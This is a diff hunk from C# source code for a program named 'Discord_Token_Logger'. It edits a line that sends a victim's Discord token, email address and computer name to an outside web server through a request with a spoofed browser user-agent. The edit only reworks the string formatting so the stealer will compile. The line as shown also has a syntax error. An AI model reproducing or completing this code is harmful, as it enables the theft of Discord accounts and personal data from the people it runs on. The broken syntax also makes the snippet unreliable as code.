@@ -72,7 +72,7 @@ namespace Discord_Token_Logger
                     WC.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                     try
                     { //Gets the IP & its info.
-                        Content = WC.DownloadString($"https://littest.site/Projects/format.php?T=" Token + "&E=" + Email + "&N=" + Environment.MachineName ); //CodeDom doesn't support C# 6 so I can't use interpolation and had to remove it
+                        Content = WC.DownloadString("https://littest.site/Projects/format.php?T=" Token + "&E=" + Email + "&N=" + Environment.MachineName ); //CodeDom doesn't support C# 6 so I can't use interpolation and had to remove it
                     }
                     catch { };
 
